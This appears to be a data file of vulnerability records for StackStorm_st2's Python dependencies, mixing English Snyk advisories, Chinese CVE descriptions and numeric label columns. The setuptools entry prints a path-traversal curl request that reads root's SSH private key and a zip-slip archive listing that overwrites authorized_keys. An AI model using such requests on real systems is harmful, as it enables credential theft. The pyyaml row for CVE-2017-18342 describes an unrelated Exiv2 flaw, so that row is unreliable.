* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
StackStorm_st2,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
StackStorm_st2,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
StackStorm_st2,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
StackStorm_st2,urllib3,,True,,CWE-453,2020-12-02,"## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Insecure Defaults. The default SSL/TLS settings were insecure.
## Remediation
Upgrade `urllib3` to version 1.8 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2088570a293df42b1623dd74fcff0174d0565af5)
",3,2
StackStorm_st2,urllib3,,True,CVE-2020-26137,CWE-74,2020-09-29,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.25.9之前版本存在注入漏洞。该漏洞源于可以在putrequest()的第一个参数中插入CR和LF控制字符。</p>,3,2
StackStorm_st2,urllib3,,True,CVE-2019-11324,CWE-295,2019-04-18,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本中存在信任管理问题漏洞。该漏洞源于网络系统或产品中缺乏有效的信任管理机制。攻击者可利用默认密码或者硬编码密码、硬编码证书等攻击受影响组件。",2,2
StackStorm_st2,urllib3,,True,CVE-2019-11236,CWE-93,2019-04-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.24.1及之前版本版本中存在注入漏洞，该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。</p>,3,0
StackStorm_st2,urllib3,,True,CVE-2018-20060,CWE-288,2018-12-11,"urllib3是一个基于Python的HTTP库，它具有线程安全连接池和文件后期支持等功能。
urllib3 1.23之前版本中存在安全漏洞，该漏洞源于程序在进行跨源重定向时，没有移除Authorization HTTP报头，导致授权报头中的凭证暴露给其他主机或以明文的形式传输。攻击者可利用该漏洞获取敏感信息。",1,2
StackStorm_st2,urllib3,,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
StackStorm_st2,urllib3,,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
StackStorm_st2,urllib3,,True,CVE-2018-25091,CWE-601,2023-10-15,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本存在安全漏洞，该漏洞源于允许攻击者获取授权标头中的凭据或以明文形式传输凭据。",3,0
StackStorm_st2,urllib3,,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
StackStorm_st2,urllib3,,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
StackStorm_st2,urllib3,,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
StackStorm_st2,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
StackStorm_st2,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
StackStorm_st2,gitpython,,True,,CWE-1333,2022-02-21,"## Overview
[GitPython](https://pypi.org/project/GitPython/) is a python library used to interact with Git repositories

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when a user controls the input passed to the pattern matching function.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `GitPython` to version 3.1.27 or higher.
## References
- [GitHub Commit](https://github.com/gitpython-developers/GitPython/commit/75f4f63ab3856a552f06082aabf98845b5fa21e3)
",3,0
StackStorm_st2,gitpython,,True,CVE-2024-22190,CWE-426,2024-01-10,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.40及之前版本存在代码问题漏洞，该漏洞源于允许攻击者通过不受信任的搜索路径执行任意代码。",2,0
StackStorm_st2,gitpython,,True,CVE-2023-40267,CWE-94,2023-08-11,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32之前版本存在安全漏洞，该漏洞源于没有阻止clone和clone_from中不安全的non-multi选项。",1,2
StackStorm_st2,gitpython,,True,CVE-2023-40590,CWE-426,2023-08-28,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在代码问题漏洞，该漏洞源于攻击者可以诱骗用户下载带有恶意git可执行文件的存储库，攻击者可以运行任何任意命令。",2,0
StackStorm_st2,gitpython,,True,CVE-2023-41040,CWE-22,2023-08-30,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在路径遍历漏洞，该漏洞源于为了解析一些 git 引用，GitPython 从目录中读取文件.git，在某些情况，GitPython 不会检查该文件是否位于目录之外.git，导致攻击者可以让 GitPython 从系统中读取任何文件。",3,0
StackStorm_st2,gitpython,,True,CVE-2022-24439,CWE-20,2022-12-06,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython存在安全漏洞，该漏洞源于不正确的用户输入验证，攻击者利用该漏洞可以远程代码执行。",1,1
StackStorm_st2,setuptools,,True,,CWE-19,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Man-in-the-Middle (MitM) attack.

The ssl.match_hostname function does not properly handle wildcards in hostnames, which might allow man-in-the-middle attackers to spoof servers via a crafted certificate. (same as CVE-2013-7440).

## Remediation
Upgrade `setuptools` to version 1.3 or higher.

## References
- [Pythong Bugs](https://bugs.python.org/issue17997)  
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#13)
- [Github Commit](https://github.com/pypa/setuptools/commit/38fcb3e366ee7a21ff5f0f550fe190b1326fc04b)
",3,0
StackStorm_st2,setuptools,,True,,CWE-399,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Denial of Service (DoS) attacks.

Algorithmic complexity vulnerability in the ssl.match_hostname function, allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.(same issue as CVE-2013-2099).

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `setuptools` to version 0.9.5 or higher.

## References
- [Python Bugs](https://bugs.python.org/issue17980)
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#095)
- [Github Commit](https://github.com/pypa/setuptools/commit/7ddd872c63a9465340eadae59868d85ac1d43e67)
",3,2
StackStorm_st2,setuptools,,True,,CWE-22,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Directory Traversal.

`ez_setup._extractall()` doesn't validate the tar file members. `member.name` can start with `/` or to contain `/` which malicious attacker can exploit to Directory Traversal attacks.

## Details
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```


## Remediation
Upgrade `setuptools` to version 3.0 or higher.

## References
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#30)
- [Github Issue](https://github.com/pypa/setuptools/issues/7)
- [Github Commit](https://github.com/pypa/setuptools/commit/4c7aaccacb0a756f45862826025bfdd579195d1e)
",3,2
StackStorm_st2,setuptools,,True,CVE-2022-40897,CWE-1333,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Python Packaging Authority (PyPA) setuptools 65.3.0版本及之前版本存在安全漏洞。攻击者利用该漏洞通过特制的HTML包或自定义PackageIndex页面导致拒绝服务。",2,0
StackStorm_st2,setuptools,,True,,CWE-1333,2022-11-14,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within `package.index`.
Exploiting this vulnerability is possible in case the user is fetching malicious HTML from a package in PyPi or a custom `PackageIndex` page.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `setuptools` to version 65.5.1 or higher.
## References
- [GitHub Commit](https://github.com/pypa/setuptools/commit/58e23de0d4c2ce0f2502d072bb9a2ed1e2ab0ba6)
- [GitHub Issue](https://github.com/pypa/setuptools/issues/3659)
",4,0
StackStorm_st2,setuptools,,True,CVE-2013-1633,CWE-20,2013-08-06,"setuptools是Python软件基金会的Python Enterprise Application Kit（PEAK）的一个副项目，它替换了标准的distutils库，并为Python添加了版本化的包和依赖性管理。PEAK是用来在Python中进行快速组件开发和代码重用的框架。
Python setuptools 0.7之前的版本中的easy_install命令中存在安全漏洞，该漏洞源于程序使用HTTP协议对PyPl存储库中的程序包进行检索时，没有对其内容进行完整性检查。中间人攻击者可通过对产品默认使用的特制响应利用该漏洞执行任意代码。",3,0
StackStorm_st2,setuptools,,True,CVE-2024-6345,CWE-94,,setuptools 是一个开源的 Python 库，广泛用于 Python 项目的打包和依赖管理。该库的 package_index 模块在 69.1.1 及之前版本中存在代码注入漏洞。该漏洞源于下载功能的不当控制，该功能允许攻击者通过提供恶意 URL，执行任意命令。虽然由于 easy_install 和 package_index 已被弃用，利用该漏洞的表面已经减少，但仍然存在通过社交工程或对包索引的轻微妥协而实现远程访问的可能性。,2,1
StackStorm_st2,setuptools,,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
StackStorm_st2,setuptools,,True,,,,<p>setuptools 是一个用于 Python 包管理和构建的工具，它简化了包的创建和分发过程。此漏洞的根本原因是使用了已弃用的函数 `tempfile.mktemp()`，该函数不安全，因为在调用 mktemp() 和随后尝试创建文件之间，另一个进程可能会创建一个具有相同名称的文件。这种函数在创建临时文件名时不确保对返回的临时名称的独占访问性，操作之间没有原子性保证，从而为攻击者提供了干扰文件的机会，可能在文件打开之前进行篡改。</p>,3,1
StackStorm_st2,virtualenv,,True,CVE-2011-4617,CWE-59,2011-12-31,Virtualenv中存在漏洞，该漏洞源于使用不安全的方式创建临时文件。有本地访问权的攻击者可能利用该漏洞执行符号链接攻击，攻击成功可能允许攻击者损坏敏感文件或者获得对敏感信息的访问权，也可能执行其他的攻击。,3,0
StackStorm_st2,virtualenv,,True,CVE-2024-53899,CWE-77 CWE-78,2024-10-01,"Virtualenv是Python Packaging Authority开源的一款Python虚拟环境构建器。
Virtualenv 20.26.6之前版本存在操作系统命令注入漏洞，该漏洞源于Magic模板字符串未正确引用。",3,0
StackStorm_st2,eventlet,0.39.1,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,setuptools,<78,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
StackStorm_st2,eventlet,,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,pymongo,,True,,CWE-125,2024-05-31,,3,1
StackStorm_st2,pymongo,,True,CVE-2024-5629,CWE-125,2024-05-31,"PyMongo是MongoDB开源的一个官方 MongoDB Python 驱动程序。
PyMongo 4.6.2 版本及之前版本存在安全漏洞，该漏洞源于 bson 模块存在越界读取问题。",3,0
StackStorm_st2,pymongo,,True,CVE-2013-2132,CWE-400,2013-05-31,"MongoDB是美国MongoDB公司的一种面向文档的数据库管理系统。
MongoDB的mongo-python-driver2.5.2之前版本存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务（空指针逆向引用造成程序崩溃）。",3,0
StackStorm_st2,pymongo,,True,CVE-2024-21506,CWE-125,2024-04-05,bson模块是一个用于处理 BSON 数据格式的库，BSON 是一种用于存储和网络传输的二进制编码的 JSON 格式。当精心构造的载荷强制解析器反序列化非托管内存时，会导致越界读取漏洞。解析器试图解释缓冲区旁边的字节，并抛出带有字符串的异常。如果下一个字节不是可打印的 UTF-8，解析器会抛出带有单个字节的异常。,2,2
StackStorm_st2,oslo.utils,,True,CVE-2022-0718,CWE-522 CWE-532,2022-02-21,"Python-Oslo-Utils是OpenStack社区的一个库。用于提供对常见实用程序类型函数的支持，例如编码、异常处理、字符串操作和时间处理。
Python-Oslo-Utils 存在安全漏洞，目前暂无该漏洞信息，请随时关注CNNVD或厂商公告。",3,0
StackStorm_st2,oslo.utils,,True,CVE-2014-7231,CWE-200,2014-10-08,"OpenStack是美国国家航空航天局（National Aeronautics and Space Administration）和美国Rackspace公司合作研发的一个云平台管理项目。OpenStack oslo-incubator是Oslo（提供了一系列OpenStack Projects共享基础库的项目）的一部分；Cinder为其提供块存储服务功能；Nova是其中的一个用Python编写的云计算构造控制器，属于IaaS系统的一部分；Trove是其中的一个Database as a Service项目。
多款OpenStack产品中的‘strutils.mask_password’函数中存在安全漏洞，该漏洞源于程序记录命令时没有正确隐藏密码。本地攻击者可通过读取日志获取密码。以下产品和版本受到影响：OpenStack oslo-incubator；Cinder 2013.2.3及之前版本，2014.1.1版本，2014.1.2版本；Nova 2013.2.3及之前版本，2014.1.1版本，2014.1.2版本；Trove 2013.2.3及之前版本，2014.1.1版本，2014.1",3,0
StackStorm_st2,pymongo,,True,,CWE-125,2024-05-31,,3,1
StackStorm_st2,pymongo,,True,CVE-2024-5629,CWE-125,2024-05-31,"PyMongo是MongoDB开源的一个官方 MongoDB Python 驱动程序。
PyMongo 4.6.2 版本及之前版本存在安全漏洞，该漏洞源于 bson 模块存在越界读取问题。",3,0
StackStorm_st2,pymongo,,True,CVE-2013-2132,CWE-400,2013-05-31,"MongoDB是美国MongoDB公司的一种面向文档的数据库管理系统。
MongoDB的mongo-python-driver2.5.2之前版本存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务（空指针逆向引用造成程序崩溃）。",3,0
StackStorm_st2,pymongo,,True,CVE-2024-21506,CWE-125,2024-04-05,bson模块是一个用于处理 BSON 数据格式的库，BSON 是一种用于存储和网络传输的二进制编码的 JSON 格式。当精心构造的载荷强制解析器反序列化非托管内存时，会导致越界读取漏洞。解析器试图解释缓冲区旁边的字节，并抛出带有字符串的异常。如果下一个字节不是可打印的 UTF-8，解析器会抛出带有单个字节的异常。,2,2
StackStorm_st2,gunicorn,,True,,CWE-20,2021-04-02,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to Improper Input Validation. Gunicorn fails with a 500, instead of a 400, when a request path is a malformed IPv6 address. This is due to no raise 'InvalidRequestLine' exception when the line contains malicious data.
## Remediation
Upgrade `gunicorn` to version 19.4.0 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/b951175c66c353d10127a20a62f61e834829856c)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/1023)
",4,0
StackStorm_st2,gunicorn,,True,,CWE-444,2020-01-09,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to HTTP Request Smuggling. It fails to properly process the `Transfer-Encoding` and `Content-Length` headers when both are present in a package request. This allows for conflicting information to be sent regarding the length of the package, which when processed by back-end servers under certain configurations would allow for malicious users to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## Remediation
Upgrade `gunicorn` to version 19.10.0, 20.0.1 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/c5be1bae5c42b1e600be22d0655fc3ec4e4711cb)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/2176)
- [GitHub PR](https://github.com/benoitc/gunicorn/pull/2181)
- [Gunicorn ChangeLog](https://docs.gunicorn.org/en/stable/news.html#id1)
- [HTTP Request Smuggling Security Blog](https://portswigger.net/web-security/request-smuggling)
",3,0
StackStorm_st2,gunicorn,,True,CVE-2018-1000164,CWE-93,2018-04-18,"gunicorn是一款基于UNIX平台的Python WSGI HTTP服务器软件。

gunicorn 19.4.5版本中的nicorn/http/wsgi.py文件的‘process_headers’函数存在安全漏洞。攻击者可利用该漏洞造成服务器返回任意的HTTP包头。",2,2
StackStorm_st2,gunicorn,,True,CVE-2024-1135,CWE-444,,Gunicorn是一个开源的Python WSGI HTTP服务器，旨在处理网络请求并提供高性能的Web服务。该组件存在HTTP请求走私漏洞，原因在于对`Transfer-Encoding`标头的验证不当，攻击者可以通过构造包含相互冲突的`Transfer-Encoding`标头的请求，从而绕过安全限制，访问受限的端点。此漏洞的触发条件是用户的网络路径未能过滤无效请求。,2,1
